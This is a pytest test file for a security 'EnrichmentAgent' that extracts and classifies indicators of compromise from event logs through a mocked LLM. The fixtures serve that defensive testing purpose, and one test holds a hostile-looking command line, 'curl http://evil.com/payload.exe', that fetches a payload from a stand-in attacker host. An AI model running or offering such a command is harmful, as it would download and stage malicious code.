from unittest.mock import patch

from agents.enrichment_agent import EnrichmentAgent


class TestEnrichmentAgent:

    def setup_method(self):
        self.agent = EnrichmentAgent()

    # --------------------------------------------------
    # Test 1 : No IOC found
    # --------------------------------------------------
    def test_no_iocs(self):

        events = [
            {
                "hostname": "PC01",
                "process_name": "notepad.exe"
            }
        ]

        result = self.agent.run(events)

        assert result == []

    # --------------------------------------------------
    # Test 2 : Successful enrichment
    # --------------------------------------------------
    @patch("agents.enrichment_agent.invoke_llm")
    def test_successful_enrichment(self, mock_llm):

        mock_llm.return_value = """
        [
            {
                "value":"192.168.1.10",
                "ioc_type":"ip",
                "source_event_id":"1",
                "verdict":"malicious",
                "confidence":0.95
            }
        ]
        """

        events = [
            {
                "event_id":"1",
                "command_line":"ping 192.168.1.10"
            }
        ]

        result = self.agent.run(events)

        assert isinstance(result, list)

        assert len(result) == 1

        assert result[0]["value"] == "192.168.1.10"

        assert result[0]["ioc_type"] == "ip"

        assert result[0]["verdict"] == "malicious"

        assert result[0]["confidence"] == 0.95

    # --------------------------------------------------
    # Test 3 : Invalid JSON -> fallback
    # --------------------------------------------------
    @patch("agents.enrichment_agent.invoke_llm")
    def test_invalid_json(self, mock_llm):

        mock_llm.return_value = "THIS IS NOT JSON"

        events = [
            {
                "event_id":"1",
                "command_line":"ping 192.168.1.10"
            }
        ]

        result = self.agent.run(events)

        assert len(result) == 1

        assert result[0]["value"] == "192.168.1.10"

        assert result[0]["ioc_type"] == "ip"

        assert result[0]["verdict"] == "unknown"

    # --------------------------------------------------
    # Test 4 : URL detection
    # --------------------------------------------------
    @patch("agents.enrichment_agent.invoke_llm")
    def test_url_detection(self, mock_llm):

        mock_llm.return_value = """
        [
            {
                "value":"http://evil.com/payload.exe",
                "ioc_type":"url",
                "source_event_id":"1",
                "verdict":"malicious"
            }
        ]
        """

        events = [
            {
                "event_id":"1",
                "command_line":"curl http://evil.com/payload.exe"
            }
        ]

        result = self.agent.run(events)

        assert len(result) == 1

        assert result[0]["value"] == "http://evil.com/payload.exe"

        assert result[0]["ioc_type"] == "url"

    # --------------------------------------------------
    # Test 5 : Domain detection
    # --------------------------------------------------
    @patch("agents.enrichment_agent.invoke_llm")
    def test_domain_detection(self, mock_llm):

        mock_llm.return_value = """
        [
            {
                "value":"evil.com",
                "ioc_type":"domain",
                "source_event_id":"1",
                "verdict":"malicious"
            }
        ]
        """

        events = [
            {
                "event_id":"1",
                "dns_query":"evil.com"
            }
        ]

        result = self.agent.run(events)

        assert len(result) == 1

        assert result[0]["value"] == "evil.com"

        assert result[0]["ioc_type"] == "domain"

    # --------------------------------------------------
    # Test 6 : Duplicate IOC removal
    # --------------------------------------------------
    @patch("agents.enrichment_agent.invoke_llm")
    def test_duplicate_iocs(self, mock_llm):

        mock_llm.return_value = """
        [
            {
                "value":"evil.com",
                "ioc_type":"domain",
                "source_event_id":"1",
                "verdict":"malicious"
            }
        ]
        """

        events = [
            {
                "event_id":"1",
                "dns_query":"evil.com"
            },
            {
                "event_id":"2",
                "url":"http://evil.com"
            },
            {
                "event_id":"3",
                "domain":"evil.com"
            }
        ]

        result = self.agent.run(events)

        values = [ioc["value"] for ioc in result]

        assert values.count("evil.com") == 1

    # --------------------------------------------------
    # Test 7 : Hallucination Detection
    # --------------------------------------------------
    @patch("agents.enrichment_agent.invoke_llm")
    def test_hallucination_detection(self, mock_llm):

        mock_llm.return_value = """
        [
            {
                "value":"google.com",
                "ioc_type":"domain",
                "source_event_id":"1",
                "verdict":"malicious"
            }
        ]
        """

        events = [
            {
                "event_id":"1",
                "dns_query":"evil.com"
            }
        ]

        result = self.agent.run(events)

        original_values = {"evil.com"}

        returned_values = {
            ioc["value"]
            for ioc in result
        }

        assert original_values != returned_values